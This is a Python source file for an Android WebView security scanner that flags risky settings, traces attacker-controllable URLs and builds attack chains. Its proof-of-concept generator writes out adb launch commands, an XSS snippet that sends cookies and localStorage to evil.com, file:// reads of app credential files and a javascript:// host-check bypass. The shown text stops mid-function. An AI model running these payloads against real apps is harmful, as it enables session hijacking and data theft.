"""
WebView Deep Analyzer - Comprehensive WebView security analysis.

Analyzes:
- WebView instantiation and configuration
- JavaScript enabled state
- JavaScript interfaces exposed
- URL loading methods and sources
- File access configuration
- SSL error handling
- Cookie settings
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from pathlib import Path


@dataclass
class WebViewInstance:
    """Represents a WebView instance found in code."""
    variable_name: str
    file_path: str
    declaration_line: int
    settings: 'WebViewSettings'
    js_interfaces: List['JSInterface']
    load_calls: List['LoadCall']
    ssl_bypass: bool = False
    containing_class: str = ""
    containing_method: str = ""
    intent_scheme_handlers: List['IntentSchemeHandler'] = field(default_factory=list)
    cookie_issues: List[Dict] = field(default_factory=list)
    evaluate_js_injections: List[Dict] = field(default_factory=list)


@dataclass
class WebViewSettings:
    """WebView security settings."""
    javascript_enabled: bool = False
    javascript_enabled_line: int = 0
    file_access: bool = False
    file_access_line: int = 0
    universal_file_access: bool = False
    universal_access_line: int = 0
    allow_content_access: bool = False
    dom_storage: bool = False
    mixed_content_mode: Optional[str] = None
    safe_browsing: bool = True


@dataclass
class JSInterface:
    """JavaScript interface exposed to WebView."""
    interface_name: str
    object_instance: str
    line_number: int
    methods: List[str] = field(default_factory=list)


@dataclass
class LoadCall:
    """A call to load content into WebView."""
    method: str  # loadUrl, loadData, loadDataWithBaseURL, evaluateJavascript, etc.
    url_source: str  # Where the URL comes from
    url_source_type: str  # "hardcoded", "intent_extra", "uri_param", "variable", "concatenated"
    line_number: int
    controllable: bool = False
    controllable_param: str = ""
    is_concatenated: bool = False  # For evaluateJavascript with string concatenation


@dataclass
class IntentSchemeHandler:
    """Tracks intent:// scheme handling in shouldOverrideUrlLoading."""
    line_number: int
    has_validation: bool = False
    has_selector_check: bool = False
    parsed_intent_var: str = ""


@dataclass
class WebViewFinding:
    """Comprehensive WebView security finding."""
    file_path: str
    webview: WebViewInstance
    vulnerabilities: List[Dict]
    attack_chains: List[Dict]
    deep_poc: str
    risk_score: int  # 0-100


class WebViewAnalyzer:
    """
    Deep analyzer for WebView security issues.
    """

    def __init__(self, decompiled_path: str, manifest_data: Dict):
        self.decompiled_path = Path(decompiled_path)
        self.manifest = manifest_data
        self.package_name = manifest_data.get('package', '')

        # Track all WebViews found
        self.webviews: List[WebViewInstance] = []

    def analyze_file(self, file_path: str) -> List[WebViewFinding]:
        """Analyze a single file for WebView security issues."""
        findings = []

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                lines = content.split('\n')
        except:
            return findings

        # Find all WebView instances
        webview_instances = self._find_webview_instances(content, lines, file_path)

        for wv in webview_instances:
            # Analyze settings
            wv.settings = self._analyze_webview_settings(content, wv.variable_name)

            # Find JS interfaces
            wv.js_interfaces = self._find_js_interfaces(content, wv.variable_name)

            # Find load calls and trace URL sources
            wv.load_calls = self._find_load_calls(content, lines, wv.variable_name)

            # Check for SSL bypass
            wv.ssl_bypass = self._check_ssl_bypass(content)

            # Check for evaluateJavascript injection (string concatenation)
            wv.evaluate_js_injections = self._find_evaluate_js_injections(content, wv.variable_name)

            # Check for intent:// scheme handling vulnerabilities
            wv.intent_scheme_handlers = self._find_intent_scheme_handlers(content)

            # Check for cookie poisoning issues
            wv.cookie_issues = self._find_cookie_issues(content)

            # Generate finding with vulnerabilities
            vulns = self._identify_vulnerabilities(wv)
            if vulns:
                attack_chains = self._build_attack_chains(wv, content)
                poc = self._generate_webview_poc(wv, attack_chains)

                findings.append(WebViewFinding(
                    file_path=file_path,
                    webview=wv,
                    vulnerabilities=vulns,
                    attack_chains=attack_chains,
                    deep_poc=poc,
                    risk_score=self._calculate_risk_score(wv, vulns),
                ))

        return findings

    def _find_webview_instances(self, content: str, lines: List[str],
                                 file_path: str) -> List[WebViewInstance]:
        """Find all WebView variable declarations/usages."""
        instances = []
        seen_vars = set()

        # Pattern for WebView declarations
        patterns = [
            # WebView webView = new WebView(context)
            r'WebView\s+(\w+)\s*=\s*new\s+WebView',
            # WebView webView = findViewById(...)
            r'WebView\s+(\w+)\s*=.*?findViewById',
            # private WebView mWebView;
            r'(?:private|protected|public)\s+WebView\s+(\w+)\s*;',
            # webView = new WebView(...)
            r'(\w+)\s*=\s*new\s+WebView\s*\(',
            # webView = binding.webView
            r'(\w+)\s*=\s*\w+\.(\w*[wW]eb[vV]iew\w*)',
        ]

        # Also check for WebView usage via getSettings(), loadUrl(), etc.
        usage_patterns = [
            r'(\w+)\.getSettings\(\)\s*\.\s*setJavaScriptEnabled',
            r'(\w+)\.loadUrl\(',
            r'(\w+)\.addJavascriptInterface\(',
            r'(\w+)\.setWebViewClient\(',
            r'(\w+)\.setWebChromeClient\(',
            r'(\w+)\.getSettings\(\)',
        ]

        for pattern in patterns + usage_patterns:
            for match in re.finditer(pattern, content):
                var_name = match.group(1)
                if var_name not in seen_vars and self._is_likely_webview(var_name, content):
                    seen_vars.add(var_name)
                    line_num = content[:match.start()].count('\n') + 1

                    instances.append(WebViewInstance(
                        variable_name=var_name,
                        file_path=file_path,
                        declaration_line=line_num,
                        settings=WebViewSettings(),
                        js_interfaces=[],
                        load_calls=[],
                    ))

        return instances

    def _is_likely_webview(self, var_name: str, content: str) -> bool:
        """Check if variable is likely a WebView."""
        # Check for WebView type annotation
        if re.search(rf'WebView\s+{var_name}\b', content):
            return True
        # Check for WebView-specific method calls
        webview_methods = ['loadUrl', 'getSettings', 'addJavascriptInterface',
                         'setWebViewClient', 'evaluateJavascript']
        for method in webview_methods:
            if re.search(rf'{var_name}\s*\.\s*{method}\s*\(', content):
                return True
        return False

    def _analyze_webview_settings(self, content: str, var_name: str) -> WebViewSettings:
        """Analyze WebView security settings."""
        settings = WebViewSettings()

        # JavaScript enabled - direct pattern
        js_pattern = rf'{var_name}\.getSettings\(\)\s*\.\s*setJavaScriptEnabled\s*\(\s*true\s*\)'
        match = re.search(js_pattern, content)
        if match:
            settings.javascript_enabled = True
            settings.javascript_enabled_line = content[:match.start()].count('\n') + 1

        # Also check settings variable pattern: settings = webView.getSettings(); settings.setJavaScriptEnabled(true);
        settings_var_match = re.search(rf'(\w+)\s*=\s*{var_name}\.getSettings\(\)', content)
        if settings_var_match:
            settings_var = settings_var_match.group(1)
            js_match = re.search(rf'{settings_var}\s*\.\s*setJavaScriptEnabled\s*\(\s*true\s*\)', content)
            if js_match:
                settings.javascript_enabled = True
                settings.javascript_enabled_line = content[:js_match.start()].count('\n') + 1

        # Another pattern: Find setJavaScriptEnabled near WebView references
        # This catches cases like: this.f9052z.getSettings() -> settings -> settings.setJavaScriptEnabled(true)
        if not settings.javascript_enabled:
            # Find all settings variables that have setJavaScriptEnabled(true)
            all_settings = re.findall(r'(\w+)\s*\.\s*setJavaScriptEnabled\s*\(\s*true\s*\)', content)
            for sv in all_settings:
                # Check if this settings variable came from our webview (or a field that might be our webview)
                if re.search(rf'{sv}\s*=\s*{var_name}\.getSettings\(\)', content):
                    settings.javascript_enabled = True
                    js_match = re.search(rf'{sv}\s*\.\s*setJavaScriptEnabled\s*\(\s*true\s*\)', content)
                    if js_match:
                        settings.javascript_enabled_line = content[:js_match.start()].count('\n') + 1
                    break
                # Also check this.FIELD pattern
                if re.search(rf'{sv}\s*=\s*this\.\w+\.getSettings\(\)', content):
                    settings.javascript_enabled = True
                    js_match = re.search(rf'{sv}\s*\.\s*setJavaScriptEnabled\s*\(\s*true\s*\)', content)
                    if js_match:
                        settings.javascript_enabled_line = content[:js_match.start()].count('\n') + 1
                    break

        # File access
        file_patterns = [
            (rf'{var_name}\.getSettings\(\)\s*\.\s*setAllowFileAccess\s*\(\s*true', 'file_access'),
            (rf'{var_name}\.getSettings\(\)\s*\.\s*setAllowUniversalAccessFromFileURLs\s*\(\s*true', 'universal_file_access'),
            (rf'{var_name}\.getSettings\(\)\s*\.\s*setAllowFileAccessFromFileURLs\s*\(\s*true', 'file_access'),
            (rf'{var_name}\.getSettings\(\)\s*\.\s*setAllowContentAccess\s*\(\s*true', 'allow_content_access'),
        ]

        for pattern, attr in file_patterns:
            if re.search(pattern, content):
                setattr(settings, attr, True)

        # DOM Storage
        if re.search(rf'{var_name}\.getSettings\(\)\s*\.\s*setDomStorageEnabled\s*\(\s*true', content):
            settings.dom_storage = True

        # Mixed content
        if re.search(rf'setMixedContentMode\s*\(\s*(?:WebSettings\.)?MIXED_CONTENT_ALWAYS_ALLOW', content):
            settings.mixed_content_mode = 'ALWAYS_ALLOW'

        return settings

    def _find_js_interfaces(self, content: str, var_name: str) -> List[JSInterface]:
        """Find JavaScript interfaces added to WebView."""
        interfaces = []

        # addJavascriptInterface(object, "name")
        pattern = rf'{var_name}\s*\.\s*addJavascriptInterface\s*\(\s*(\w+)\s*,\s*["\'](\w+)["\']'

        for match in re.finditer(pattern, content):
            obj_instance = match.group(1)
            interface_name = match.group(2)
            line_num = content[:match.start()].count('\n') + 1

            # Try to find methods in the interface class
            methods = self._find_interface_methods(content, obj_instance)

            interfaces.append(JSInterface(
                interface_name=interface_name,
                object_instance=obj_instance,
                line_number=line_num,
                methods=methods,
            ))

        return interfaces

    def _find_interface_methods(self, content: str, obj_instance: str) -> List[str]:
        """Find methods exposed via @JavascriptInterface annotation."""
        methods = []

        # Look for @JavascriptInterface annotated methods
        pattern = r'@JavascriptInterface\s+(?:public\s+)?(\w+)\s+(\w+)\s*\('

        for match in re.finditer(pattern, content):
            return_type = match.group(1)
            method_name = match.group(2)
            methods.append(method_name)

        return methods

    def _find_load_calls(self, content: str, lines: List[str],
                         var_name: str) -> List[LoadCall]:
        """Find all URL loading calls and trace URL sources."""
        load_calls = []

        # Patterns for loading content
        load_patterns = [
            (rf'{var_name}\s*\.\s*loadUrl\s*\(\s*([^)]+)\)', 'loadUrl'),
            (rf'{var_name}\s*\.\s*loadData\s*\(\s*([^)]+)\)', 'loadData'),
            (rf'{var_name}\s*\.\s*loadDataWithBaseURL\s*\(\s*([^)]+)\)', 'loadDataWithBaseURL'),
            (rf'{var_name}\s*\.\s*postUrl\s*\(\s*([^)]+)\)', 'postUrl'),
        ]

        for pattern, method in load_patterns:
            for match in re.finditer(pattern, content):
                url_arg = match.group(1).split(',')[0].strip()
                line_num = content[:match.start()].count('\n') + 1

                # Analyze URL source
                source_type, controllable, param_name = self._analyze_url_source(
                    content, url_arg, line_num
                )

                load_calls.append(LoadCall(
                    method=method,
                    url_source=url_arg,
                    url_source_type=source_type,
                    line_number=line_num,
                    controllable=controllable,
                    controllable_param=param_name,
                ))

        return load_calls

    def _analyze_url_source(self, content: str, url_arg: str,
                            line_num: int) -> Tuple[str, bool, str]:
        """Analyze where a URL comes from - is it controllable by attacker?"""

        # Hardcoded URL
        if url_arg.startswith('"') or url_arg.startswith("'"):
            return ('hardcoded', False, '')

        # Check if it's a method parameter (potentially controllable)
        method_param_pattern = rf'(?:public|private|protected|void|\w+)\s+\w+\s*\([^)]*(?:String|Uri)\s+{re.escape(url_arg)}\b'
        if re.search(method_param_pattern, content):
            return ('method_param', True, url_arg)

        # Escape url_arg for use in regex patterns
        url_arg_escaped = re.escape(url_arg)

        # Check if variable comes from Intent extra
        intent_patterns = [
            rf'{url_arg_escaped}\s*=.*?getStringExtra\s*\(\s*["\']([^"\']+)["\']',
            rf'{url_arg_escaped}\s*=.*?getIntent\(\).*?get\w+Extra\s*\(\s*["\']([^"\']+)["\']',
            rf'String\s+{url_arg_escaped}\s*=.*?getStringExtra\s*\(\s*["\']([^"\']+)["\']',
            rf'{url_arg_escaped}\s*=.*?getString\s*\(\s*["\']([^"\']+)["\']',
        ]

        for pattern in intent_patterns:
            match = re.search(pattern, content)
            if match:
                return ('intent_extra', True, match.group(1))

        # Check if from URI query parameter
        uri_patterns = [
            rf'{url_arg_escaped}\s*=.*?getQueryParameter\s*\(\s*["\']([^"\']+)["\']',
            rf'{url_arg_escaped}\s*=.*?getData\(\).*?getQueryParameter\s*\(\s*["\']([^"\']+)["\']',
        ]

        for pattern in uri_patterns:
            match = re.search(pattern, content)
            if match:
                return ('uri_param', True, match.group(1))

        # Check if from bundle/extras
        bundle_patterns = [
            rf'{url_arg_escaped}\s*=.*?getExtras\(\).*?getString\s*\(\s*["\'](\w+)["\']',
            rf'{url_arg_escaped}\s*=.*?bundle.*?getString\s*\(\s*["\'](\w+)["\']',
        ]

        for pattern in bundle_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return ('bundle_extra', True, match.group(1))

        # Track variable assignment backwards
        var_assignment = re.search(rf'{url_arg_escaped}\s*=\s*([^;]+);', content)
        if var_assignment:
            assigned_value = var_assignment.group(1)
            # Recursively check the assigned value
            if 'getIntent' in assigned_value or 'getExtra' in assigned_value:
                return ('intent_derived', True, url_arg)
            if 'getData' in assigned_value or 'getQueryParameter' in assigned_value:
                return ('uri_derived', True, url_arg)

        return ('variable', False, url_arg)

    def _check_ssl_bypass(self, content: str) -> bool:
        """Check if WebViewClient bypasses SSL errors."""
        # onReceivedSslError with handler.proceed()
        pattern = r'onReceivedSslError[^}]*handler\s*\.\s*proceed\s*\('
        return bool(re.search(pattern, content, re.DOTALL | re.IGNORECASE))

    def _find_evaluate_js_injections(self, content: str, var_name: str) -> List[Dict]:
        """
        Find evaluateJavascript calls with string concatenation (potential injection).
        Pattern from Oversecured: webView.evaluateJavascript("processData('" + userInput + "')")
        """
        injections = []

        # Pattern for evaluateJavascript with concatenation
        patterns = [
            # Direct concatenation: evaluateJavascript("..." + var + "...")
            rf'{var_name}\s*\.\s*evaluateJavascript\s*\(\s*"[^"]*"\s*\+\s*(\w+)',
            rf'{var_name}\s*\.\s*evaluateJavascript\s*\(\s*["\'][^"\']*["\']\s*\+\s*(\w+)',
            # String.format or similar
            rf'{var_name}\s*\.\s*evaluateJavascript\s*\(\s*String\.format\s*\([^)]+,\s*(\w+)',
            # Variable that was built with concatenation
            rf'(\w+)\s*=\s*"[^"]*"\s*\+.*?;.*?{var_name}\s*\.\s*evaluateJavascript\s*\(\s*\1',
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, content, re.DOTALL):
                var = match.group(1)
                line_num = content[:match.start()].count('\n') + 1

                # Check if the concatenated variable is user-controllable
                is_controllable = self._is_variable_controllable(content, var)

                injections.append({
                    'line': line_num,
                    'variable': var,
                    'controllable': is_controllable,
                    'pattern': 'string_concatenation',
                })

        return injections

    def _find_intent_scheme_handlers(self, content: str) -> List[IntentSchemeHandler]:
        """
        Find intent:// scheme handling in shouldOverrideUrlLoading.
        Pattern from Oversecured: Unsafe Intent.parseUri without selector check.
        """
        handlers = []

        # Look for shouldOverrideUrlLoading implementations
        override_pattern = r'shouldOverrideUrlLoading\s*\([^)]+\)\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}'

        for match in re.finditer(override_pattern, content, re.DOTALL):
            method_body = match.group(1)
            line_num = content[:match.start()].count('\n') + 1

            # Check for Intent.parseUri (handling of intent:// scheme)
            parse_uri_match = re.search(r'Intent\.parseUri\s*\([^,]+,\s*(\w+)\)', method_body)
            if parse_uri_match:
                parsed_var = ''
                # Find what variable stores the parsed intent
                intent_var_match = re.search(r'(\w+)\s*=\s*Intent\.parseUri', method_body)
                if intent_var_match:
                    parsed_var = intent_var_match.group(1)

                # Check for validation
                has_validation = bool(re.search(r'getScheme\(\)|getHost\(\)|startsWith\s*\(', method_body))

                # Critical: Check for setSelector(null) - required to prevent hijacking
                has_selector_check = bool(re.search(r'setSelector\s*\(\s*null\s*\)', method_body))

                handlers.append(IntentSchemeHandler(
                    line_number=line_num,
                    has_validation=has_validation,
                    has_selector_check=has_selector_check,
                    parsed_intent_var=parsed_var,
                ))

        # Also check for intent:// in URL checks without proper validation
        if 'intent://' in content.lower() or '"intent"' in content.lower():
            intent_check = re.search(r'startsWith\s*\(\s*["\']intent://', content)
            if intent_check and not handlers:
                line_num = content[:intent_check.start()].count('\n') + 1
                handlers.append(IntentSchemeHandler(
                    line_number=line_num,
                    has_validation=True,
                    has_selector_check=False,  # Need to verify setSelector(null)
                ))

        return handlers

    def _find_cookie_issues(self, content: str) -> List[Dict]:
        """
        Find cookie poisoning vulnerabilities.
        Pattern from Oversecured: CookieManager.setCookie(attackerUrl, cookie)
        """
        issues = []

        # Pattern for setCookie calls
        cookie_patterns = [
            r'CookieManager\s*\.\s*getInstance\s*\(\s*\)\s*\.\s*setCookie\s*\(\s*(\w+)',
            r'(\w+)\s*\.\s*setCookie\s*\(\s*(\w+)',
        ]

        for pattern in cookie_patterns:
            for match in re.finditer(pattern, content):
                url_var = match.group(1) if match.lastindex == 1 else match.group(2)
                line_num = content[:match.start()].count('\n') + 1

                # Check if URL is controllable
                is_controllable = self._is_variable_controllable(content, url_var)

                if is_controllable:
                    issues.append({
                        'type': 'cookie_poisoning',
                        'line': line_num,
                        'url_variable': url_var,
                        'description': 'Cookie set for potentially attacker-controlled URL',
                    })

        return issues

    def _is_variable_controllable(self, content: str, var_name: str) -> bool:
        """Check if a variable is user-controllable (from Intent, URI, etc.)."""
        var_escaped = re.escape(var_name)

        controllable_patterns = [
            rf'{var_escaped}\s*=.*?getStringExtra\s*\(',
            rf'{var_escaped}\s*=.*?getIntent\s*\(\s*\)',
            rf'{var_escaped}\s*=.*?getQueryParameter\s*\(',
            rf'{var_escaped}\s*=.*?getData\s*\(\s*\)',
            rf'{var_escaped}\s*=.*?getExtras\s*\(\s*\)',
            rf'String\s+{var_escaped}\s*=.*?getStringExtra',
            rf'{var_escaped}\s*=.*?request\.getUrl\(',
        ]

        for pattern in controllable_patterns:
            if re.search(pattern, content):
                return True

        # Check if it's a method parameter
        if re.search(rf'(?:public|private|protected|void|\w+)\s+\w+\s*\([^)]*\b{var_escaped}\b', content):
            return True

        return False

    def _identify_vulnerabilities(self, wv: WebViewInstance) -> List[Dict]:
        """Identify all vulnerabilities in a WebView instance."""
        vulns = []

        # JavaScript enabled vulnerabilities
        if wv.settings.javascript_enabled:
            # Check for controllable URLs with JS enabled
            controllable_found = False
            for load in wv.load_calls:
                if load.controllable:
                    controllable_found = True
                    vulns.append({
                        'type': 'JS_ENABLED_CONTROLLABLE_URL',
                        'severity': 'Critical',
                        'title': 'JavaScript Enabled with Attacker-Controlled URL',
                        'description': f'WebView loads URL from {load.url_source_type} '
                                     f'parameter "{load.controllable_param}" with JavaScript enabled. '
                                     f'Attacker can inject malicious JavaScript.',
                        'line': load.line_number,
                        'param': load.controllable_param,
                    })

            # If JS enabled but we found loadUrl calls with variable (potential control)
            if not controllable_found:
                for load in wv.load_calls:
                    if load.url_source_type == 'variable':
                        vulns.append({
                            'type': 'JS_ENABLED_DYNAMIC_URL',
                            'severity': 'High',
                            'title': 'JavaScript Enabled with Dynamic URL',
                            'description': f'WebView loads URL from variable "{load.url_source}" with '
                                         f'JavaScript enabled. Trace data flow to determine if controllable.',
                            'line': load.line_number,
                            'variable': load.url_source,
                        })

            # JavaScript interface with JS enabled
            for js_if in wv.js_interfaces:
                vulns.append({
                    'type': 'JS_INTERFACE_EXPOSED',
                    'severity': 'High',
                    'title': f'JavaScript Interface "{js_if.interface_name}" Exposed',
                    'description': f'JavaScript interface exposes native methods to web content. '
                                 f'Methods: {", ".join(js_if.methods) or "unknown"}',
                    'line': js_if.line_number,
                    'interface': js_if.interface_name,
                })

            # Just JS enabled is also worth noting in exported components
            if not vulns and wv.load_calls:
                vulns.append({
                    'type': 'JS_ENABLED_WEBVIEW',
                    'severity': 'Medium',
                    'title': 'WebView with JavaScript Enabled',
                    'description': f'WebView has JavaScript enabled at line {wv.settings.javascript_enabled_line}. '
                                 f'Found {len(wv.load_calls)} URL load calls. Review for XSS risks.',
                    'line': wv.settings.javascript_enabled_line,
                })

        # File access vulnerabilities
        if wv.settings.universal_file_access:
            vulns.append({
                'type': 'UNIVERSAL_FILE_ACCESS',
                'severity': 'Critical',
                'title': 'Universal File Access Enabled',
                'description': 'setAllowUniversalAccessFromFileURLs(true) allows JavaScript from '
                             'file:// URLs to access any file and make cross-origin requests.',
                'line': wv.settings.universal_access_line,
            })

        if wv.settings.file_access:
            for load in wv.load_calls:
                if load.controllable:
                    vulns.append({
                        'type': 'FILE_SCHEME_INJECTION',
                        'severity': 'High',
                        'title': 'File Scheme Injection Possible',
                        'description': f'File access enabled and URL from {load.url_source_type} is controllable. '
                                     f'Attacker can read local files via file:// URLs.',
                        'line': load.line_number,
                        'param': load.controllable_param,
                    })

        # SSL bypass
        if wv.ssl_bypass:
            vulns.append({
                'type': 'SSL_BYPASS',
                'severity': 'Critical',
                'title': 'SSL Certificate Validation Bypassed',
                'description': 'WebViewClient calls handler.proceed() in onReceivedSslError, '
                             'accepting invalid certificates. Enables MITM attacks.',
                'line': wv.declaration_line,
            })

        # Mixed content
        if wv.settings.mixed_content_mode == 'ALWAYS_ALLOW':
            vulns.append({
                'type': 'MIXED_CONTENT',
                'severity': 'Medium',
                'title': 'Mixed Content Allowed',
                'description': 'MIXED_CONTENT_ALWAYS_ALLOW permits loading HTTP resources '
                             'from HTTPS pages, enabling content injection via MITM.',
                'line': wv.declaration_line,
            })

        # evaluateJavascript injection (Oversecured pattern)
        for injection in wv.evaluate_js_injections:
            severity = 'Critical' if injection.get('controllable') else 'High'
            vulns.append({
                'type': 'EVALUATE_JS_INJECTION',
                'severity': severity,
                'title': 'JavaScript Injection via evaluateJavascript',
                'description': f'evaluateJavascript() uses string concatenation with variable '
                             f'"{injection.get("variable")}". '
                             f'{"Attacker can inject arbitrary JavaScript." if injection.get("controllable") else "Trace data flow for controllability."}',
                'line': injection.get('line'),
                'variable': injection.get('variable'),
            })

        # Intent scheme handler vulnerabilities (Oversecured pattern)
        for handler in wv.intent_scheme_handlers:
            if not handler.has_selector_check:
                vulns.append({
                    'type': 'INTENT_SCHEME_HIJACK',
                    'severity': 'Critical',
                    'title': 'Intent Scheme Handler Without Selector Check',
                    'description': 'Intent.parseUri() is used without calling setSelector(null). '
                                 'Attacker can use intent:// URLs with a selector to hijack the '
                                 'intent and launch arbitrary components with the app\'s permissions.',
                    'line': handler.line_number,
                })
            elif not handler.has_validation:
                vulns.append({
                    'type': 'INTENT_SCHEME_NO_VALIDATION',
                    'severity': 'High',
                    'title': 'Intent Scheme Handler Without URL Validation',
                    'description': 'Intent:// scheme is handled without validating the destination. '
                                 'Even with setSelector(null), verify the intent target is trusted.',
                    'line': handler.line_number,
                })

        # Cookie poisoning (Oversecured pattern)
        for cookie_issue in wv.cookie_issues:
            vulns.append({
                'type': 'COOKIE_POISONING',
                'severity': 'High',
                'title': 'Cookie Poisoning via Controllable URL',
                'description': f'CookieManager.setCookie() is called with URL from variable '
                             f'"{cookie_issue.get("url_variable")}". Attacker can set cookies '
                             f'for arbitrary domains, potentially hijacking sessions.',
                'line': cookie_issue.get('line'),
            })

        # JavaScript scheme bypass check (javascript://host/%0a pattern)
        for load in wv.load_calls:
            if load.controllable and wv.settings.javascript_enabled:
                # Check if there's a host validation that could be bypassed
                vulns.append({
                    'type': 'JAVASCRIPT_SCHEME_BYPASS',
                    'severity': 'High',
                    'title': 'Potential JavaScript Scheme Bypass',
                    'description': f'URL loaded from {load.url_source_type} may be vulnerable to '
                                 f'javascript:// scheme bypass. Pattern: javascript://trusted.com/%0aalert(1) '
                                 f'bypasses host-based URL validation while executing JavaScript.',
                    'line': load.line_number,
                    'param': load.controllable_param,
                })
                break  # Only report once

        return vulns

    def _build_attack_chains(self, wv: WebViewInstance, content: str) -> List[Dict]:
        """Build complete attack chains showing how to exploit the WebView."""
        chains = []

        # Find if containing class is exported
        is_exported = self._check_if_exported(wv.file_path, content)
        intent_filters = self._get_intent_filters(wv.file_path, content)

        for load in wv.load_calls:
            if not load.controllable:
                continue

            chain = {
                'name': f'URL Injection via {load.url_source_type}',
                'steps': [],
                'entry_point': None,
                'payload_location': load.controllable_param,
            }

            # Determine entry point
            if is_exported:
                class_name = self._extract_class_name(content)
                chain['entry_point'] = {
                    'type': 'exported_activity',
                    'component': class_name,
                }
                chain['steps'].append({
                    'step': 1,
                    'action': 'Launch exported Activity',
                    'detail': f'The Activity containing this WebView is exported and directly accessible',
                })

            if intent_filters:
                for intent_filter in intent_filters:
                    if intent_filter.get('data'):
                        chain['entry_point'] = {
                            'type': 'deep_link',
                            'data': intent_filter['data'],
                        }
                        chain['steps'].append({
                            'step': 1,
                            'action': 'Trigger via deep link',
                            'detail': f'App handles deep link: {intent_filter["data"]}',
                        })

            # Add exploitation steps
            if load.url_source_type == 'intent_extra':
                chain['steps'].append({
                    'step': 2,
                    'action': f'Provide malicious URL in Intent extra "{load.controllable_param}"',
                    'detail': 'The app reads this extra and loads it into WebView',
                })
            elif load.url_source_type == 'uri_param':
                chain['steps'].append({
                    'step': 2,
                    'action': f'Inject URL via query parameter "{load.controllable_param}"',
                    'detail': 'URL parameter value flows directly to WebView.loadUrl()',
                })

            # Add JS exploitation if enabled
            if wv.settings.javascript_enabled:
                chain['steps'].append({
                    'step': 3,
                    'action': 'JavaScript executes in WebView context',
                    'detail': 'setJavaScriptEnabled(true) allows full JS execution',
                })

                if wv.js_interfaces:
                    for js_if in wv.js_interfaces:
                        chain['steps'].append({
                            'step': 4,
                            'action': f'Call native methods via {js_if.interface_name} interface',
                            'detail': f'Available methods: {", ".join(js_if.methods) or "check source"}',
                        })

            chains.append(chain)

        return chains

    def _check_if_exported(self, file_path: str, content: str) -> bool:
        """Check if the class is exported based on manifest."""
        class_name = self._extract_class_name(content)
        package = self._extract_package(content)
        full_name = f"{package}.{class_name}"

        for activity in self.manifest.get('activities', []):
            if activity.get('name') == full_name or activity.get('name', '').endswith(f'.{class_name}'):
                return activity.get('exported', False) or bool(activity.get('intent_filters'))

        return False

    def _get_intent_filters(self, file_path: str, content: str) -> List[Dict]:
        """Get intent filters for this component."""
        class_name = self._extract_class_name(content)
        package = self._extract_package(content)
        full_name = f"{package}.{class_name}"

        for activity in self.manifest.get('activities', []):
            if activity.get('name') == full_name or activity.get('name', '').endswith(f'.{class_name}'):
                return activity.get('intent_filters', [])

        return []

    def _extract_class_name(self, content: str) -> str:
        """Extract class name from source."""
        match = re.search(r'class\s+(\w+)', content)
        return match.group(1) if match else 'Unknown'

    def _extract_package(self, content: str) -> str:
        """Extract package from source."""
        match = re.search(r'package\s+([\w.]+)\s*;', content)
        return match.group(1) if match else ''

    def _generate_webview_poc(self, wv: WebViewInstance,
                               attack_chains: List[Dict]) -> str:
        """Generate detailed WebView exploitation PoC."""
        lines = []
        package = self.package_name

        lines.append("# " + "=" * 60)
        lines.append("# WEBVIEW DEEP ANALYSIS - PROOF OF CONCEPT")
        lines.append("# " + "=" * 60)
        lines.append("")

        # WebView Configuration Summary
        lines.append("# WEBVIEW SECURITY CONFIGURATION:")
        lines.append(f"#   JavaScript Enabled: {'YES ⚠️' if wv.settings.javascript_enabled else 'NO ✓'}")
        lines.append(f"#   File Access: {'YES ⚠️' if wv.settings.file_access else 'NO ✓'}")
        lines.append(f"#   Universal File Access: {'YES ⚠️⚠️' if wv.settings.universal_file_access else 'NO ✓'}")
        lines.append(f"#   SSL Bypass: {'YES ⚠️⚠️' if wv.ssl_bypass else 'NO ✓'}")
        lines.append(f"#   JS Interfaces: {len(wv.js_interfaces)}")
        lines.append("")

        # Entry points
        for chain in attack_chains:
            entry = chain.get('entry_point') or {}
            if entry.get('type') == 'exported_activity':
                lines.append(f"# ENTRY POINT: Exported Activity")
                lines.append(f"#   Component: {entry.get('component')}")
            elif entry.get('type') == 'deep_link':
                lines.append(f"# ENTRY POINT: Deep Link")
                lines.append(f"#   URI: {entry.get('data')}")
        lines.append("")

        # Generate exploitation commands
        lines.append("# " + "=" * 60)
        lines.append("# EXPLOITATION COMMANDS")
        lines.append("# " + "=" * 60)
        lines.append("")

        for chain in attack_chains:
            param = chain.get('payload_location', 'url')
            entry = chain.get('entry_point') or {}

            if entry.get('type') == 'exported_activity':
                component = entry.get('component', '')
                full_component = f"{package}/{package}.{component}" if not '.' in component else f"{package}/{component}"

                lines.append(f"# Attack Chain: {chain.get('name')}")
                lines.append("")

                # XSS Attack
                lines.append("# === ATTACK 1: Cross-Site Scripting (XSS) ===")
                lines.append("# Inject JavaScript to steal sensitive data")
                lines.append(f"adb shell am start -n {full_component} \\")
                lines.append(f'    --es "{param}" "https://evil.com/xss.html"')
                lines.append("")
                lines.append("# xss.html content:")
                lines.append("# <script>")
                lines.append("#   fetch('https://evil.com/steal?cookies=' + document.cookie);")
                lines.append("#   fetch('https://evil.com/steal?storage=' + JSON.stringify(localStorage));")
                lines.append("# </script>")
                lines.append("")

                # Phishing
                lines.append("# === ATTACK 2: Phishing / Credential Theft ===")
                lines.append("# Load fake login page in app's trusted context")
                lines.append(f"adb shell am start -n {full_component} \\")
                lines.append(f'    --es "{param}" "https://evil.com/fake-login.html"')
                lines.append("")

                # File Access (if enabled)
                if wv.settings.file_access or wv.settings.universal_file_access:
                    lines.append("# === ATTACK 3: Local File Exfiltration ===")
                    lines.append("# Read app's private files via file:// scheme")
                    lines.append(f"adb shell am start -n {full_component} \\")
                    lines.append(f'    --es "{param}" "file:///data/data/{package}/shared_prefs/auth.xml"')
                    lines.append("")

                    if wv.settings.universal_file_access:
                        lines.append("# Universal access allows reading ANY file:")
                        lines.append(f"adb shell am start -n {full_component} \\")
                        lines.append(f'    --es "{param}" "file:///etc/hosts"')
                        lines.append("")

                # JavaScript Interface exploitation
                for js_if in wv.js_interfaces:
                    lines.append(f"# === ATTACK 4: JavaScript Interface Exploitation ===")
                    lines.append(f"# Call native methods via window.{js_if.interface_name}")
                    lines.append(f"adb shell am start -n {full_component} \\")
                    lines.append(f'    --es "{param}" "javascript:window.{js_if.interface_name}.METHOD()"')
                    lines.append("")
                    lines.append(f"# Available interface methods: {', '.join(js_if.methods) or 'analyze source'}")
